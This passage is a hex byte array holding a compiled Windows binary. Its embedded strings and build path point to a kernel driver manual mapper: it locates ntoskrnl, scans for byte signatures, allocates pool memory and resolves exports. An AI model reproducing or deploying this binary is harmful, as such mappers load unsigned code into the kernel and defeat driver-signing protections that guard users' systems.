	0x49, 0x30, 0x0f, 0x10, 0x48, 0xd0, 0x0f, 0x11, 0x41, 0x40, 0x0f, 0x10,
	0x40, 0xe0, 0x0f, 0x11, 0x49, 0x50, 0x0f, 0x10, 0x48, 0xf0, 0x0f, 0x11,
	0x41, 0x60, 0x48, 0x8d, 0x89, 0x80, 0x00, 0x00, 0x00, 0x0f, 0x11, 0x49,
	0xf0, 0x48, 0x83, 0xea, 0x01, 0x75, 0xae, 0x0f, 0x10, 0x00, 0x48, 0x8b,
	0xd5, 0x0f, 0x10, 0x48, 0x10, 0x48, 0x8b, 0x40, 0x20, 0x0f, 0x11, 0x01,
	0x0f, 0x11, 0x49, 0x10, 0x48, 0x89, 0x41, 0x20, 0x48, 0x8d, 0x4c, 0x24,
	0x48, 0xe8, 0x86, 0x01, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x75, 0x0c, 0xff,
	0xc6, 0x3b, 0x37, 0x0f, 0x82, 0x62, 0xff, 0xff, 0xff, 0xeb, 0x05, 0x48,
	0x8b, 0x5c, 0x24, 0x30, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0x55,
	0x08, 0x00, 0x00, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x9c, 0x24, 0x50, 0x01,
	0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x6b, 0x20, 0x49, 0x8b,
	0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5f, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
	0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
	0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x41, 0x8b, 0xe8,
	0x4c, 0x8b, 0xf2, 0x33, 0xff, 0x8b, 0xd5, 0x45, 0x33, 0xc9, 0x48, 0x89,
	0x78, 0xe8, 0x45, 0x33, 0xc0, 0xff, 0x15, 0x45, 0x08, 0x00, 0x00, 0x48,
	0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x66, 0x33, 0xd2, 0x48, 0x8b, 0xcb,
	0x44, 0x8d, 0x42, 0x02, 0xff, 0x15, 0x0e, 0x08, 0x00, 0x00, 0x45, 0x33,
	0xc9, 0xc7, 0x44, 0x24, 0x28, 0x20, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc0,
	0x89, 0x7c, 0x24, 0x20, 0x33, 0xd2, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x01,
	0x08, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x1d, 0x4c,
	0x8b, 0xc5, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xc8, 0xe8, 0xeb, 0x00, 0x00,
	0x00, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0xff, 0x15, 0xe7, 0x07, 0x00,
	0x00, 0x40, 0xb7, 0x01, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xcb, 0x07, 0x00,
	0x00, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xe2, 0x07, 0x00, 0x00, 0x40, 0x8a,
	0xc7, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48,
	0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4,
	0x30, 0x41, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
	0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xec, 0x40,
	0x48, 0x83, 0x60, 0x20, 0x00, 0x49, 0x8b, 0xe8, 0x48, 0x8b, 0xf2, 0x48,
	0x8b, 0xf9, 0xff, 0x15, 0xa4, 0x07, 0x00, 0x00, 0x48, 0x8b, 0xd8, 0xff,
	0x15, 0x9b, 0x07, 0x00, 0x00, 0x4c, 0x8b, 0xcf, 0x4c, 0x8b, 0xc3, 0x48,
	0x8b, 0xc8, 0x48, 0x8b, 0xd6, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x48, 0x89,
	0x44, 0x24, 0x30, 0xc6, 0x44, 0x24, 0x28, 0x00, 0x48, 0x89, 0x6c, 0x24,
	0x20, 0xff, 0x15, 0x85, 0x07, 0x00, 0x00, 0x85, 0xc0, 0x78, 0x0b, 0x48,
	0x39, 0x6c, 0x24, 0x68, 0x75, 0x04, 0xb0, 0x01, 0xeb, 0x02, 0x32, 0xc0,
	0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b,
	0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xff, 0x25, 0x09,
	0x07, 0x00, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xff, 0x25, 0x02, 0x07, 0x00, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x4c, 0x8b, 0xd9, 0x48,
	0x2b, 0xd1, 0x0f, 0x82, 0xa2, 0x01, 0x00, 0x00, 0x49, 0x83, 0xf8, 0x4f,
	0x73, 0x58, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x03, 0x74, 0x16, 0x0f,
	0x1f, 0x44, 0x00, 0x00, 0x48, 0x8b, 0x04, 0x11, 0x48, 0x83, 0xc1, 0x08,
	0x49, 0xff, 0xc9, 0x48, 0x89, 0x41, 0xf8, 0x75, 0xef, 0x49, 0x83, 0xe0,
	0x07, 0x74, 0x17, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x8a, 0x04, 0x11, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0x88, 0x41, 0xff,
	0x75, 0xf2, 0x49, 0x8b, 0xc3, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
	0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x83, 0xfa, 0x10, 0x72, 0x70,
	0xf7, 0xd9, 0x83, 0xe1, 0x0f, 0x74, 0x0e, 0x4c, 0x2b, 0xc1, 0xf3, 0x41,
	0x0f, 0x6f, 0x04, 0x13, 0xf3, 0x41, 0x0f, 0x7f, 0x03, 0x49, 0x03, 0xcb,
	0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x05, 0x49, 0x81, 0xf9, 0x00, 0x20,
	0x00, 0x00, 0x0f, 0x87, 0x76, 0x00, 0x00, 0x00, 0x49, 0x83, 0xe0, 0x1f,
	0xf3, 0x0f, 0x6f, 0x04, 0x11, 0xf3, 0x0f, 0x6f, 0x4c, 0x11, 0x10, 0x48,
	0x83, 0xc1, 0x20, 0x66, 0x0f, 0x7f, 0x41, 0xe0, 0x66, 0x0f, 0x7f, 0x49,
	0xf0, 0x49, 0xff, 0xc9, 0x75, 0xe2, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x66,
	0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xf6, 0xc1, 0x0f, 0x74, 0xa3, 0x8a, 0x04, 0x11,
	0x49, 0xff, 0xc8, 0x88, 0x01, 0x48, 0xff, 0xc1, 0xf6, 0xc1, 0x0f, 0x75,
	0xf0, 0xeb, 0x91, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x81, 0xfa, 0x00, 0x02, 0x00,
	0x00, 0x72, 0x81, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x0f, 0x18, 0x04, 0x11,
	0x0f, 0x18, 0x44, 0x11, 0x40, 0x48, 0x81, 0xc1, 0x80, 0x00, 0x00, 0x00,
	0xff, 0xc8, 0x75, 0xec, 0x48, 0x81, 0xe9, 0x00, 0x02, 0x00, 0x00, 0xb8,
	0x08, 0x00, 0x00, 0x00, 0xf3, 0x0f, 0x6f, 0x04, 0x11, 0xf3, 0x0f, 0x6f,
	0x4c, 0x11, 0x10, 0x66, 0x0f, 0xe7, 0x01, 0x66, 0x0f, 0xe7, 0x49, 0x10,
	0x48, 0x83, 0xc1, 0x40, 0xf3, 0x0f, 0x6f, 0x44, 0x11, 0xe0, 0xf3, 0x0f,
	0x6f, 0x4c, 0x11, 0xf0, 0x66, 0x0f, 0xe7, 0x41, 0xe0, 0x66, 0x0f, 0xe7,
	0x49, 0xf0, 0xff, 0xc8, 0x75, 0xce, 0x49, 0x81, 0xe8, 0x00, 0x02, 0x00,
	0x00, 0x49, 0x81, 0xf8, 0x00, 0x02, 0x00, 0x00, 0x73, 0x99, 0xf0, 0x80,
	0x0c, 0x24, 0x00, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x05, 0x0f, 0x85,
	0x08, 0xff, 0xff, 0xff, 0xe9, 0x79, 0xfe, 0xff, 0xff, 0x0f, 0x1f, 0x80,
	0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x49, 0x03, 0xc8, 0x49, 0x83, 0xf8,
	0x4f, 0x73, 0x4f, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x03, 0x74, 0x11,
	0x48, 0x8b, 0x44, 0x11, 0xf8, 0x48, 0x83, 0xe9, 0x08, 0x49, 0xff, 0xc9,
	0x48, 0x89, 0x01, 0x75, 0xef, 0x49, 0x83, 0xe0, 0x07, 0x74, 0x17, 0x66,
	0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8a, 0x44, 0x11, 0xff,
	0x48, 0xff, 0xc9, 0x49, 0xff, 0xc8, 0x88, 0x01, 0x75, 0xf2, 0x49, 0x8b,
	0xc3, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x83,
	0xfa, 0xf0, 0x77, 0x74, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x0f, 0x74, 0x11,
	0x4c, 0x2b, 0xc1, 0x48, 0xf7, 0xd9, 0xf3, 0x0f, 0x6f, 0x44, 0x10, 0xf0,
	0xf3, 0x0f, 0x7f, 0x40, 0xf0, 0x48, 0x03, 0xc8, 0x4d, 0x8b, 0xc8, 0x49,
	0xc1, 0xe9, 0x05, 0x49, 0x81, 0xf9, 0x00, 0x20, 0x00, 0x00, 0x0f, 0x87,
	0x76, 0x00, 0x00, 0x00, 0x49, 0x83, 0xe0, 0x1f, 0xf3, 0x0f, 0x6f, 0x44,
	0x11, 0xf0, 0xf3, 0x0f, 0x6f, 0x4c, 0x11, 0xe0, 0x48, 0x83, 0xe9, 0x20,
	0x66, 0x0f, 0x7f, 0x41, 0x10, 0x66, 0x0f, 0x7f, 0x09, 0x49, 0xff, 0xc9,
	0x75, 0xe2, 0xe9, 0x54, 0xff, 0xff, 0xff, 0x66, 0x66, 0x66, 0x66, 0x66,
	0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66,
	0x66, 0x66, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xf6, 0xc1, 0x0f, 0x74, 0xa3, 0x48, 0xff, 0xc9, 0x8a, 0x04, 0x11, 0x49,
	0xff, 0xc8, 0x88, 0x01, 0xf6, 0xc1, 0x0f, 0x75, 0xf0, 0xeb, 0x91, 0x66,
	0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
	0x90, 0x90, 0x48, 0x81, 0xfa, 0x00, 0xfe, 0xff, 0xff, 0x77, 0x81, 0xb8,
	0x04, 0x00, 0x00, 0x00, 0x48, 0x81, 0xe9, 0x80, 0x00, 0x00, 0x00, 0x0f,
	0x18, 0x04, 0x11, 0x0f, 0x18, 0x44, 0x11, 0x40, 0xff, 0xc8, 0x75, 0xec,
	0x48, 0x81, 0xc1, 0x00, 0x02, 0x00, 0x00, 0xb8, 0x08, 0x00, 0x00, 0x00,
	0xf3, 0x0f, 0x6f, 0x44, 0x11, 0xf0, 0xf3, 0x0f, 0x6f, 0x4c, 0x11, 0xe0,
	0x66, 0x0f, 0xe7, 0x41, 0xf0, 0x66, 0x0f, 0xe7, 0x49, 0xe0, 0x48, 0x83,
	0xe9, 0x40, 0xf3, 0x0f, 0x6f, 0x44, 0x11, 0x10, 0xf3, 0x0f, 0x6f, 0x0c,
	0x11, 0x66, 0x0f, 0xe7, 0x41, 0x10, 0x66, 0x0f, 0xe7, 0x09, 0xff, 0xc8,
	0x75, 0xce, 0x49, 0x81, 0xe8, 0x00, 0x02, 0x00, 0x00, 0x49, 0x81, 0xf8,
	0x00, 0x02, 0x00, 0x00, 0x73, 0x99, 0xf0, 0x80, 0x0c, 0x24, 0x00, 0x4d,
	0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x05, 0x0f, 0x85, 0x08, 0xff, 0xff, 0xff,
	0xe9, 0x7e, 0xfe, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x48, 0x8b, 0xc1, 0x49, 0x83, 0xf8, 0x08, 0x72, 0x47, 0x0f, 0xb6, 0xd2,
	0x49, 0xb9, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x49, 0x0f,
	0xaf, 0xd1, 0x49, 0x83, 0xf8, 0x4f, 0x73, 0x50, 0x4d, 0x8b, 0xc8, 0x49,
	0x83, 0xe1, 0xf8, 0x49, 0x03, 0xc9, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00,
	0x4a, 0x89, 0x54, 0x08, 0xf8, 0x49, 0x83, 0xe9, 0x08, 0x75, 0xf5, 0x49,
	0x83, 0xe0, 0x07, 0x74, 0x05, 0x4a, 0x89, 0x54, 0x01, 0xf8, 0xc3, 0x66,
	0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x83, 0xe0, 0x07,
	0x74, 0x0a, 0x42, 0x88, 0x54, 0x00, 0xff, 0x49, 0xff, 0xc8, 0x75, 0xf6,
	0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x66, 0x48, 0x0f, 0x6e, 0xc2, 0x0f, 0x16, 0xc0,
	0x0f, 0x11, 0x01, 0x4c, 0x03, 0xc1, 0x48, 0x83, 0xc1, 0x10, 0x48, 0x83,
	0xe1, 0xf0, 0x4c, 0x2b, 0xc1, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x07,
	0x74, 0x2f, 0x0f, 0x29, 0x01, 0x0f, 0x29, 0x41, 0x10, 0x48, 0x81, 0xc1,
	0x80, 0x00, 0x00, 0x00, 0x0f, 0x29, 0x41, 0xa0, 0x0f, 0x29, 0x41, 0xb0,
	0x49, 0xff, 0xc9, 0x0f, 0x29, 0x41, 0xc0, 0x0f, 0x29, 0x41, 0xd0, 0x0f,
	0x29, 0x41, 0xe0, 0x0f, 0x29, 0x41, 0xf0, 0x75, 0xd5, 0x49, 0x83, 0xe0,
	0x7f, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x04, 0x74, 0x12, 0x66, 0x0f,
	0x1f, 0x44, 0x00, 0x00, 0x0f, 0x11, 0x01, 0x48, 0x83, 0xc1, 0x10, 0x49,
	0xff, 0xc9, 0x75, 0xf4, 0x49, 0x83, 0xe0, 0x0f, 0x74, 0x06, 0x42, 0x0f,
	0x11, 0x44, 0x01, 0xf0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x6e, 0x74, 0x6f, 0x73, 0x6b, 0x72, 0x6e, 0x6c, 0x2e, 0x65, 0x78, 0x65,
	0x00, 0xcc, 0xcc, 0xcc, 0x5b, 0x64, 0x62, 0x67, 0x5d, 0x20, 0x46, 0x61,
	0x69, 0x6c, 0x65, 0x64, 0x20, 0x74, 0x6f, 0x20, 0x66, 0x69, 0x6e, 0x64,
	0x20, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x20, 0x62, 0x61, 0x73, 0x65,
	0x0a, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0x78, 0x78, 0x78, 0x3f, 0x3f, 0x3f, 0x3f, 0x78,
	0x3f, 0x3f, 0x3f, 0x3f, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x00, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x48, 0x8b, 0x05, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00, 0x00,
	0x8b, 0xc8, 0x85, 0xc0, 0x78, 0x40, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x5b, 0x64, 0x62, 0x67,
	0x5d, 0x20, 0x46, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x20, 0x74, 0x6f, 0x20,
	0x66, 0x69, 0x6e, 0x64, 0x20, 0x74, 0x68, 0x65, 0x20, 0x66, 0x75, 0x6e,
	0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x70, 0x6f, 0x69, 0x6e, 0x74, 0x65,
	0x72, 0x0a, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x49, 0x6d, 0x61, 0x67,
	0x65, 0x20, 0x64, 0x6f, 0x65, 0x73, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x68,
	0x61, 0x76, 0x65, 0x20, 0x44, 0x4f, 0x53, 0x20, 0x73, 0x69, 0x67, 0x6e,
	0x61, 0x74, 0x75, 0x72, 0x65, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x46, 0x61, 0x69, 0x6c,
	0x65, 0x64, 0x20, 0x74, 0x6f, 0x20, 0x61, 0x6c, 0x6c, 0x6f, 0x63, 0x61,
	0x74, 0x65, 0x20, 0x70, 0x6f, 0x6f, 0x6c, 0x20, 0x6f, 0x66, 0x20, 0x73,
	0x69, 0x7a, 0x65, 0x20, 0x30, 0x78, 0x25, 0x58, 0x00, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x46, 0x61, 0x69, 0x6c,
	0x65, 0x64, 0x20, 0x74, 0x6f, 0x20, 0x66, 0x69, 0x6e, 0x64, 0x20, 0x6d,
	0x6f, 0x64, 0x75, 0x6c, 0x65, 0x20, 0x25, 0x73, 0x00, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0x46, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x20, 0x74,
	0x6f, 0x20, 0x66, 0x69, 0x6e, 0x64, 0x20, 0x65, 0x78, 0x70, 0x6f, 0x72,
	0x74, 0x20, 0x25, 0x73, 0x20, 0x69, 0x6e, 0x20, 0x6d, 0x6f, 0x64, 0x75,
	0x6c, 0x65, 0x20, 0x25, 0x73, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0x55, 0x6e, 0x73, 0x75, 0x70, 0x70, 0x6f, 0x72,
	0x74, 0x65, 0x64, 0x20, 0x72, 0x65, 0x6c, 0x6f, 0x63, 0x61, 0x74, 0x69,
	0x6f, 0x6e, 0x20, 0x74, 0x79, 0x70, 0x65, 0x20, 0x25, 0x64, 0x00, 0xcc,
	0x5b, 0x64, 0x62, 0x67, 0x5d, 0x20, 0x5a, 0x77, 0x51, 0x75, 0x65, 0x72,
	0x79, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x49, 0x6e, 0x66, 0x6f, 0x72,
	0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x73,
	0x69, 0x7a, 0x65, 0x20, 0x66, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x3a, 0x20,
	0x25, 0x78, 0x0a, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0x5b, 0x64, 0x62, 0x67, 0x5d, 0x20, 0x46, 0x61,
	0x69, 0x6c, 0x65, 0x64, 0x20, 0x74, 0x6f, 0x20, 0x61, 0x6c, 0x6c, 0x6f,
	0x63, 0x61, 0x74, 0x65, 0x20, 0x25, 0x64, 0x20, 0x62, 0x79, 0x74, 0x65,
	0x73, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x6d, 0x6f, 0x64, 0x75, 0x6c, 0x65,
	0x73, 0x0a, 0x00, 0xcc, 0x5b, 0x64, 0x62, 0x67, 0x5d, 0x20, 0x5a, 0x77,
	0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x49,
	0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x66,
	0x61, 0x69, 0x6c, 0x65, 0x64, 0x3a, 0x20, 0x25, 0x78, 0x0a, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa8, 0x60, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xb6, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xc8, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x60, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xf0, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xfa, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x61, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x1a, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2a, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4a, 0x61, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x60, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x70, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x61, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x92, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xae, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa9, 0x19, 0x68, 0x5f,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00,
	0xb8, 0x20, 0x00, 0x00, 0xb8, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xa9, 0x19, 0x68, 0x5f, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00,
	0x08, 0x01, 0x00, 0x00, 0xfc, 0x20, 0x00, 0x00, 0xfc, 0x14, 0x00, 0x00,
	0x52, 0x53, 0x44, 0x53, 0xc1, 0xd2, 0x53, 0x78, 0xf3, 0x57, 0xcb, 0x46,
	0x95, 0x1c, 0x91, 0xa4, 0xa3, 0xf5, 0x1b, 0xe0, 0x48, 0x00, 0x00, 0x00,
	0x44, 0x3a, 0x5c, 0x53, 0x74, 0x75, 0x66, 0x66, 0x5c, 0x75, 0x6d, 0x61,
	0x70, 0x5c, 0x6d, 0x61, 0x70, 0x70, 0x65, 0x72, 0x5c, 0x78, 0x36, 0x34,
	0x5c, 0x52, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5c, 0x6d, 0x61, 0x70,
	0x70, 0x65, 0x72, 0x2e, 0x70, 0x64, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x40, 0x09, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78,
	0x74, 0x24, 0x6d, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x40, 0x19, 0x00, 0x00,
	0x30, 0x04, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6d, 0x6e,
	0x24, 0x32, 0x31, 0x00, 0x70, 0x1d, 0x00, 0x00, 0x1b, 0x02, 0x00, 0x00,
	0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x73, 0x00, 0x00, 0x20, 0x00, 0x00,
	0x80, 0x00, 0x00, 0x00, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35,
	0x00, 0x00, 0x00, 0x00, 0x80, 0x20, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00,
	0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0xb8, 0x20, 0x00, 0x00,
	0x60, 0x01, 0x00, 0x00, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7a,
	0x7a, 0x7a, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x18, 0x22, 0x00, 0x00,
	0x0c, 0x01, 0x00, 0x00, 0x2e, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x2e, 0x62, 0x73, 0x73,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00,
	0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
	0x48, 0x00, 0x00, 0x00, 0x2e, 0x65, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x00, 0x60, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x2e, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0x14, 0x60, 0x00, 0x00,
	0x14, 0x00, 0x00, 0x00, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33,
	0x00, 0x00, 0x00, 0x00, 0x28, 0x60, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
	0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00,
	0xa8, 0x60, 0x00, 0x00, 0x2a, 0x01, 0x00, 0x00, 0x2e, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x17, 0x0b, 0x00, 0x02, 0x16, 0x00, 0x06,
